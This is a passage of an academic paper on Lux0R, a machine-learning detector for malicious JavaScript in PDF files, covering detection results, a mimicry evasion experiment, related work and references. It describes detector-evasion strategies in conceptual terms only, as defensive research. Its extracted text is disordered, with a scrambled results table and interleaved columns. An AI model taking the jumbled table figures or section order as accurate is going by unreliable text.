DR=malware detection
rate, FPR=false-positive rate.

CVE Splits

Lux0R

PjScan

Learn
2007

2007→08
2007→09
2007→10
2007→11

Test

2008→14
2009→14
2010→14
2011→14
2012→14

DR

DR

FPR

FPR
96.27% 0.64% 45.33% 0.19%
97.97% 0.83% 74.85% 0.36%
0.44% 24.68% 0.53%
100%
0.25% 16.07% 0.71%
100%
100%
15.55% 0.73%

0%

splits 2008→14, 2009→14 and 2010→14, respectively.
4.4 Adversarial Evaluation

We also tested our system against adversarial manipula-
tion of malware samples, considering a simple, most likely,
model of adversary. In fact, as soon as malware detectors
such as Lux0R are employed in real-world deployment, they
may face with a determined adversary who is willing to evade
detection with minimum eﬀort. According to the architec-
ture in Figure 2, the adversary may attack our system at
diﬀerent levels of abstraction:

1. API reference extraction: devising a malware instance
for which our analysis framework based on phoneypdf
fails to extract some relevant API references;

2. API reference selection: corrupting our dataset with
malicious samples so that the API selection process
extracts a sub-optimal set of references;

3. Classiﬁcation: manipulating the set of API references
employed by JavaScript code so as to (a) mislead the
model selection algorithm, (b) evade detection.

Attacks of type (1) require the adversary to thoroughly
study how our framework works, to ﬁnd and exploit limits
in the Adobe-DOM emulation/implementation or in the ex-
ecution of JavaScript code. To devise attacks of type (2) and
(3a), the adversary needs to acquire some control over our
data sources, as well as over the systems that we employed
to validate the label of PDF samples [6]. Finally, attacks of
type (3b) simply require the adversary to manipulate mal-
ware samples that are analyzed by Lux0R during its detection
phase. Whereas all these attacks might be indeed possible,
in this evaluation we focus on the latter attack (3b), which
(we believe) is one of the most probable in real-world de-
ployment, and, more importantly, goes to the “heart” of our
approach.

But, how to devise a malware sample with the aim of
evading our system? There are basically two choices: the
adversary may either (a) modify a working exploit to avoid
using some API references that have been selected by Lux0R;
or (b) add API references to a working exploit. We focus on
the latter approach, which is indeed the simplest one, works
with any kind of exploit, and can be automated with little
eﬀort by an adversary. Now, what kind of references might
be added by an adversary? The simplest attack might be
to add a number of API references typically found in benign
JavaScript, performing a mimicry attack based on feature
addition.

4.4.1 Mimicry Attack based on Feature Addition
In order to emulate the mimicry attack, we added B be-
nign JavaScript codes to a PDF malware correctly classiﬁed
by Lux0R. Both malicious and benign samples have been ran-
domly sampled from the testing set. We repeated the pro-
cess X times (with ﬁve diﬀerent training-testing splits) and
evaluated the average ratio (probability) of evasion against
Lux0R, for diﬀerent values of the API selection threshold
t (see Section 3.2). We also kept track of the normalized
AUC1% (Area under ROC curve for FPR≤1%) of Lux0R
for the same values of t. We employed the same learning
parameters as in the statistical and CVE-based evaluation.
Table 4 shows the results of our evaluation, for B = X =
100, i.e., 100 benign codes were added to each malicious sam-
ple, and we repeated this process for 100 times. As it can
be seen, there are some statistical ﬂuctuations, especially
for AUC1%, whose estimation might be performed on rela-
tively low number of ROC points (only points for FPR below
1% are considered). However, we chose to display AUC1%
instead of the full AUC, since it is much more indicative of
Lux0R’s accuracy for real-world operating points. In general,
the larger the threshold t, the lower the chance of evasion
by mimicry attacks based on feature addition. For nega-
tive values of t we select also API references that are more
frequent in benign documents. From one hand, this may
improve the detection accuracy, since we may exploit more
information about benign samples (see, e.g., the result for
t = −0.1). On the other hand, negative values for t increase
the chance of evasion, since an adversary may arbitrarily
add API references that are typically encountered in benign
ﬁles. This, in turn may increase the chance of classiﬁcation
errors. Moreover, the number of features tend to increase,
and this may increase the chance of “overﬁtting” the detec-
tion model on known data (thus, even slight variations of
known samples might be misclassiﬁed). In previous evalua-
tions we chose a value of t = 0.2, that, according to Figure
4, can be considered a good tradeoﬀ between classiﬁer ac-
curacy and robustness against evasion by such a category of
attack. Nevertheless, higher thresholds can be chosen with-
out actually noticing signiﬁcant drops in the classiﬁcation
accuracy (substantially, there is not negative correlation be-
tween AUC1% and t in the considered range).

Indeed, malware developers may attempt to evade Lux0R
using more targeted techniques, e.g., trying to understand
which features have been selected by Lux0R, and focusing
on their modiﬁcation. Such attacks would be much more
sophisticated than the above emulated one: They require
the adversary to reverse engineer the internal parameters of
Lux0R, e.g., actively probing it, and/or emulating its be-
havior. For instance, evasion patterns can be computed
through a gradient descent attack, building a surrogate copy
of Lux0R [5, 4, 3]. To this end, the adversary needs to col-
lect a surrogate dataset, replicate the API extraction process
and build a surrogate classiﬁer that emulates the behavior
of Lux0R. Such kind of attacks, although feasible, requires a
much larger eﬀort to the adversary.

5. LIMITATIONS AND FUTURE WORK

As shown in §4, the method implemented in Lux0R is con-
ceptually simple, and performs exceptionally well in detect-
ing JavaScript-based PDF threats. Nevertheless, we recog-
nize some main limitations.

54of browser-based JavaScript exploits. Prophiler [7] stati-
cally analyzes Javascript, HTML and the associated URL
to detect malicious web pages. Other approaches propose a
purely dynamic analysis. ICESHIELD [12] implements both
a wrapping and an overwriting mechanism to achieve run-
time monitoring of function calls. NOZZLE [27] is a runtime
heap-spraying detector. Hybrid solutions have been pro-
posed as well. In ZOZZLE [9], a dynamic module collects the
JavaScript code that is generated at runtime. Then, the ex-
tracted code is classiﬁed according to a static analysis (i.e.,
it is not executed). Similarly, JStill [33] leverages on a run-
time component to deobfuscate JavaScript code. Cujo [28]
implements a static detection mechanism based on q-grams,
which is complemented by a dynamic analysis component
for the detection of heap-spraying attacks. EARLYBIRD [29]
integrates the detection algorithm of Cujo enabling early
detection of malicious JavaScript.

Obfuscation.

Some systems [7, 8, 9, 27, 28] consider the presence of
obfuscation as a key characteristic of malicious code. Thus,
JavaScript code is classiﬁed employing a number of features
that might indicate the presence of obfuscation. On the
other hand, systems such as [15, 20, 33] simply try to deob-
fuscate JavaScript code and classify its “plaintext” version.

Speciﬁcity.

It considers if the detection mechanism has been explicitly
devised to detect malicious JavaScript executed into a par-
ticular environment (e.g. a web browser) or if it is portable
to other applications. Approaches such as those proposed
by Cova et al. [8] or by Kapravelos et al. [16] are tailored to
detect web-based malware. On the other hand, algorithms
such as ZOZZLE [9], NOZZLE [27], Cujo [28], EARLYBIRD [29],
and JStill [33] may potentially be used on diﬀerent envi-
ronments, since they focus on a pure analysis of JavaScript
code.

With respect to the aforementioned taxonomy, the pro-

posed detection algorithm:

• is based on both static and dynamic analysis of Java-

Script code (e.g., as in ZOZZLE [9]);

• although some selected API references might be re-
lated to obfuscation routines, Lux0R does not explicitly
consider the obfuscation as an indication of malicious-
ness;

• can be portable to diﬀerent environments. Moving
from one application to another would require to iden-
tify (a) the related set of API references; (b) a runtime
environment capable to capture both statically and dy-
namically generated API references.

Whereas Lux0R is in principle agnostic to the speciﬁc ap-
plication domain, in this paper we provided a case study
on the detection of malicious JavaScript within PDF ﬁles.
Thus, in the following paragraph we brieﬂy provide addi-
tional details concerning three systems, namely, Wepawet,
MDScan, and PjScan, explicitly devised for this purpose.

Wepawet [14] is a publicly available online service based on
JSand, developed by Cova et al. [8], which dynamically ana-
lyzes JavaScript code. In particular, after having extracted
the code from the PDF ﬁle through a static analysis, JSand

Figure 4: Probability of evasion by mimicry attack
through feature addition, and normalized AUC1% of
Lux0R for various values of the API selection thresh-
old t.

As mentioned in Section 4.4, any error in the API extrac-
tion process may negatively aﬀect the accuracy of our detec-
tor. In fact, we encountered many cases in which phoneypdf
was unable to completely execute malicious JavaScript code
due to limits in the Adobe DOM emulation. Even in the
presence of these emulation errors, the set of extracted API
references was suﬃcient to detect malicious patterns, for the
great majority of cases we encountered. However, improving
the Adobe DOM emulation remains a fundamental task to
cope with obfuscated malware samples.

Malware samples employing completely diﬀerent API ref-
erences (with respect to those selected by Lux0R during the
learning phase), might escape from detection by Lux0R. The
detection approach of Lux0R clearly raises the bar against
malware implementation, but future work is needed to cope
with the possible presence of such malware samples. A possi-
ble solution might be to raise an alert whenever too few API
references are extracted from JavaScript code, compared to
its size. In the presence of such alerts, manual inspection
might be necessary.
Finally, as mentioned in §4.4, Lux0R might be attacked
by implementing a gradient descent attack to automatically
ﬁnd API reference patterns (see §3) capable of evading de-
tection [3]. In order to evaluate our system against advanced
evasion techniques, this attack may be worth of investigation
in future work.

6. RELATED WORK

The detection of malicious JavaScript code is a challeng-
ing research problem, for which various studies have been
published so far. We identify three main aspects through
which Lux0R, as well as existing related literature can be
framed.

Type of the analysis.

It can be either static or dynamic [10]. Kapravelos et
[16] propose a purely static approach to the detection

al.

55deobfuscates it and extracts information from its execution
(adopting Mozilla’s Rhino [25]). Such information is related,
for example, to the number of bytes allocated through string
operations, to the number of likely shellcode strings, and so
forth. It then uses a Bayesian classiﬁer to distinguish be-
tween benign and malicious samples.
It is worth nothing
that Wepawet has been originally devised to detect mali-
cious JavaScript inside web pages, and its engine has been
updated constantly over the past years. Additionally, when-
ever a malware sample matches a known signature, Wepawet
describes the exploited vulnerabilities as well as their related
CVE reference.

MDScan has been developed by Tzermias et al. in 2011 [31].
It statically extracts JavaScript code from a PDF ﬁle and
then dynamically analyzes it by using SpiderMonkey as in-
terpreter. In particular, the interpreter is instructed to scan
each new string that is allocated into memory for the pres-
ence of shellcode. Its detection is then performed by Nemu,
a widely used tool that detects various types of shellcodes
through a set of runtime heuristics. MDScan has not been
released to the public.

PjScan is a tool made in 2011 by Laskov et al. [19] and it
statically analyzes PDF JavaScript code to establish whether
it is malicious or not. It adopts SpiderMonkey [26] as a Java-
Script interpreter. This interpreter extracts a sequences of
tokens from each code in the ﬁle (it can be more than one):
tokens can be functions as eval or unescape (empirically
determined from previous knowledge of possible dangerous
functions), or lexical elements such as semicolons, equals,
operators and so forth. Once these token sequences are
converted into feature values, a one-class SVM classiﬁer is
trained on malicious PDF samples.

7. CONCLUSION

In this paper, we presented Lux0R, a lightweight machine
learning tool capable of accurately detecting JavaScript-based
exploits. Diﬀerently from previous work, our method does
not rely on prior knowledge about malware code. We auto-
matically identify API references that characterize malicious
code and employ them to infer an accurate detection model.
Our extensive investigation, based on thousands of PDF
malware samples collected in the wild, indicates that the
proposed method is able to achieve excellent results in terms
of malware detection accuracy, throughput, and in terms of
generalization, i.e., capability to detect new JavaScript ex-
ploits. We also evaluated our tool against a mimicry attack
based on API reference addition, that may likely take place
once our system is deployed in a real-world setting. Our
results clearly show that choosing a suitable threshold t for
the API selection algorithm, Lux0R can be both accurate
and robust against such kind of evasion attack. All samples
employed in this investigation can be downloaded through
the VirusTotal API, relying on the sha256sum hashes that
we released to the public.

Albeit our investigation focuses on JavaScript code within
PDF documents, the proposed approach is fairly general,
and can be easily adopted in other application domains. In
fact, we are currently working on an extension of Lux0R for
the analysis of malicious JavaScript code in web pages. We
are also working to release our tool with open-source license.

Acknowledgments
This work has been partly supported by the Regional Ad-
ministration of Sardinia (RAS), Italy, within the project
“Advanced and secure sharing of multimedia data over social
networks in the future Internet” (CRP-17555). The project
is funded within the framework of the regional law, L.R.
7/2007, Bando 2009. The opinions, ﬁndings and conclu-
sions expressed in this paper are solely those of the authors
and do not necessarily reﬂect the opinions of any sponsor.

8. REFERENCES
[1] Adobe Systems Inc. JavaScript for Acrobat API

Reference.
Http://www.adobe.com/content/dam/Adobe/en/
devnet/acrobat/pdfs/js_api_reference.pdf - Last
visited December 6, 2013, April 2007.

[2] A. Albertini. Pdftricks: a summary of pdf tricks -

encodings, structures, javascript. https:
//code.google.com/p/corkami/wiki/PDFTricks,
March 2013. Corkami Wiki.

[3] B. Biggio, I. Corona, D. Maiorca, B. Nelson,

N. Srndic, P. Laskov, G. Giacinto, and F. Roli.
Evasion attacks against machine learning at test time.
In H. Blockeel, editor, European Conference on
Machine Learning and Principles and Practice of
Knowledge Discovery in Databases (ECML PKDD),
Part III. Springer-Verlag Berlin Heidelberg, 2013.

[4] B. Biggio, I. Corona, B. Nelson, B. Rubinstein,

D. Maiorca, G. Fumera, G. Giacinto, and F. Roli.
Security evaluation of support vector machines in
adversarial environments. In Y. Ma and G. Guo,
editors, Support Vector Machines Applications, pages
105–153. Springer International Publishing, 2014.

[5] B. Biggio, G. Fumera, and F. Roli. Security evaluation
of pattern classiﬁers under attack. IEEE Transactions
on Knowledge and Data Engineering, 26(4):984–996,
April 2014.

[6] B. Biggio, B. Nelson, and P. Laskov. Poisoning attacks

against support vector machines. In J. Langford and
J. Pineau, editors, 29th Int’l Conf. on Machine
Learning. Omnipress, 2012.

[7] D. Canali, M. Cova, G. Vigna, and C. Kruegel.

Prophiler: A fast ﬁlter for the large-scale detection of
malicious web pages. In Proceedings of the 20th
International Conference on World Wide Web, WWW
’11, pages 197–206, New York, NY, USA, 2011. ACM.

[8] M. Cova, C. Kruegel, and G. Vigna. Detection and
analysis of drive-by-download attacks and malicious
javascript code. In Proceedings of the 19th
international conference on World wide web, WWW
’10, pages 281–290, New York, NY, USA, 2010. ACM.

[9] C. Curtsinger, B. Livshits, B. Zorn, and C. Seifert.

Zozzle: Fast and precise in-browser javascript malware
detection. In Proceedings of the 20th USENIX
Conference on Security, SEC’11, Berkeley, CA, USA,
2011. USENIX Association.

[10] M. Egele, T. Scholte, E. Kirda, and C. Kruegel. A

survey on automated dynamic malware-analysis
techniques and tools. ACM Computing Surveys,
44(2):6:1–6:42, March 2008.

[11] M. Engleberth, C. Willems, and T. Holz. Detecting

malicious documents with combined static and

56Resources. https://developer.mozilla.org/en-US/
docs/Web/JavaScript/Language_Resources,
December 2013.

[25] Mozilla Developer Network. Rhino.

https://developer.mozilla.org/en-US/docs/Rhino,
December 2013.

[26] M. D. Network. SpiderMonkey.

https://developer.mozilla.org/en-US/docs/
Mozilla/Projects/SpiderMonkey, December 2013.

[27] P. Ratanaworabhan, B. Livshits, and B. Zorn. Nozzle:

A defense against heap-spraying code injection
attacks. In Proc. of the 18th Conference on USENIX
Security Symposium, SSYM’09, pages 169–186,
Berkeley, CA, USA, 2009. USENIX Association.

[28] K. Rieck, T. Krueger, and A. Dewald. Cujo: eﬃcient

detection and prevention of drive-by-download
attacks. In Proceedings of the 26th Annual Computer
Security Applications Conference, ACSAC ’10, pages
31–39, New York, NY, USA, 2010. ACM.

[29] K. Sch¨utt, M. Kloft, A. Bikadorov, and K. Rieck.
Early detection of malicious behavior in javascript
code. In Proceedings of the 5th ACM Workshop on
Security and Artiﬁcial Intelligence, AISec ’12, pages
15–24, New York, NY, USA, 2012. ACM.

[30] C. Smutz and A. Stavrou. Malicious pdf detection

using metadata and structural features. In Proceedings
of the 28th Annual Computer Security Applications
Conference, ACSAC ’12, pages 239–248, New York,
NY, USA, 2012. ACM.

[31] Z. Tzermias, G. Sykiotakis, M. Polychronakis, and

E. P. Markatos. Combining static and dynamic
analysis for the detection of malicious documents. In
Proceedings of the Fourth European Workshop on
System Security, EUROSEC ’11, pages 4:1–4:6, New
York, NY, USA, 2011. ACM.

[32] N. ˇSrndi´c and P. Laskov. Detection of malicious pdf

ﬁles based on hierarchical document structure. In
Proceedings of the 20th Annual Network & Distributed
System Security Symposium, 2013.

[33] W. Xu, F. Zhang, and S. Zhu. Jstill: Mostly static

detection of obfuscated malicious javascript code. In
Proceedings of the Third ACM Conference on Data
and Application Security and Privacy, CODASPY ’13,
pages 117–128, New York, NY, USA, 2013. ACM.

dynamic analysis. Technical report, Virus Bulletin,
2009.

[12] M. Heiderich, T. Frosch, and T. Holz. Iceshield:

Detection and mitigation of malicious websites with a
frozen dom. In Proceedings of the 14th International
Conference on Recent Advances in Intrusion
Detection, RAID’11, pages 281–300, Berlin,
Heidelberg, 2011. Springer-Verlag.

[13] G. Inc. Virustotal. http://www.virustotal.com,

December 2013.

[14] iSec lab. Wepawet. http://wepawet.cs.ucsb.edu,

December 2013.

[15] S. Kaplan, B. Livshits, B. Zorn, C. Siefert, and

C. Cursinger. “nofus: Automatically detecting” +
string.fromcharcode(32) + “obfuscated”. tolowercase()
+ “javascript code”. TechReport MSR-TR-2011-57,
Microsoft Research, 2011.

[16] A. Kapravelos, Y. Shoshitaishvili, M. Cova,

C. Kruegel, and G. Vigna. Revolver: An automated
approach to the detection of evasiveweb-based
malware. In Proceedings of the 22Nd USENIX
Conference on Security, SEC’13, pages 637–652,
Berkeley, CA, USA, 2013. USENIX Association.

[17] Kaspersky Lab. Kaspersky lab identiﬁes ˆOminiduke ˜O,

a new malicious program designed for spying on
multiple government entities and institutions across
the world. http://www.kaspersky.com/about/news/
virus/2013/Kaspersky_Lab_Identifies_MiniDuke_
a_New_Malicious_Program_Designed_for_Spying_
on_Multiple_Government_Entities_and_
Institutions_Across_the_World, February 2013.

[18] R. Kohavi. A study of cross-validation and bootstrap

for accuracy estimation and model selection. In
Proceedings of the 14th International Joint Conference
on Artiﬁcial Intelligence - Volume 2, IJCAI’95, pages
1137–1143, San Francisco, CA, USA, 1995. Morgan
Kaufmann Publishers Inc.

[19] P. Laskov and N. ˇSrndi´c. Static detection of malicious

javascript-bearing pdf documents. In Proceedings of
the 27th Annual Computer Security Applications
Conference, ACSAC ’11, pages 373–382, New York,
NY, USA, 2011. ACM.

[20] P. Likarish, E. Jung, and I. Jo. Obfuscated malicious
javascript detection using classiﬁcation techniques. In
Malicious and Unwanted Software (MALWARE), 2009
4th International Conference on, pages 47–54, 2009.
[21] D. Maiorca, I. Corona, and G. Giacinto. Looking at

the bag is not enough to ﬁnd the bomb: An evasion of
structural methods for malicious pdf ﬁles detection. In
Proceedings of the 8th ACM SIGSAC Symposium on
Information, Computer and Communications Security,
ASIA CCS ’13, pages 119–130, New York, NY, USA,
2013. ACM.

[22] D. Maiorca, G. Giacinto, and I. Corona. A pattern

recognition system for malicious pdf ﬁles detection. In
Proceedings of the 8th international conference on
Machine Learning and Data Mining in Pattern
Recognition, MLDM’12, pages 510–524, Berlin,
Heidelberg, 2012. Springer-Verlag.

[23] MITRE. Common vulnerabilities and exposures.

http://cve.mitre.org, December 2013.

[24] Mozilla Developer Network. JavaScript Language

57